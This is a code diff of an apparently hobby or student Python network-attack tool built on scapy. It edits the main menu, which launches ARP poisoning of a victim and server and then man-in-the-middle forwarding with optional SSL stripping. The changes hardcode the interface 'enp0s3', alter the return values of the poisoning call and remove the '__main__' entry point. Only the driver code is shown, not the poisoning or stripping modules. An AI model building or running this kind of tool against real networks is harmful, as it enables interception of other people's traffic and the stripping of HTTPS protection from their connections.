@@ -8,12 +8,13 @@ victimIP = ""
 serverIP = ""
 victimMac = ""
 serverMac = ""
-attackerIP = sc.conf.route.route("0.0.0.0")[1]
-attackerMac = sc.get_if_hwaddr(sc.conf.iface)
+attackerIP = sc.get_if_addr("enp0s3")
+attackerMac = sc.get_if_hwaddr("enp0s3")
 
 
 def main():
     while True:
+        print(attackerIP, attackerMac)
         ipt = ""
         ip_range = ""
         targets = ""
@@ -75,17 +76,16 @@ def main():
                     sslStrip = input("Use ssl stripping when possible: yes, no").strip().lower()
 
             if ipt == "arp":
-                serverMac, victimMac = ArpPoisen.arp_poisoning(victimIP, serverIP, silent)
+                serverMac, victimMac, serverIP, victimIP = ArpPoisen.arp_poisoning(victimIP, serverIP, silent)
 
             if goal == "ownserver":
-                forwardToExternalServer(victimIP, ownServerIp, attackerIP)
                 return
                 
             elif goal == "mitm":
                 if (sslStrip == "yes" or sslStrip == "y"):
-                    sslStripping.forwarding(True, victimIP, attackerIP, victimMac, serverIP, attackerMac, serverMac)
+                    sslStripping.forwarding(True, "enp0s3", victimIP, attackerIP, victimMac, serverIP, attackerMac, serverMac)
                 else:
-                    sslStripping.forwarding(False, victimIP, attackerIP, victimMac, serverIP, attackerMac, serverMac)
+                    sslStripping.forwarding(False, "enp0s3", victimIP, attackerIP, victimMac, serverIP, attackerMac, serverMac)
 
         elif ipt == "quit":
             break
@@ -173,5 +173,4 @@ def is_ipv4_address(s):
 def forwardToExternalServer(client_ip, server_ip, attacker_ip):
     ArpPoisen.own_server(client_ip, server_ip, attacker_ip)
 
-if __name__ == "__main__":
-    main()
+
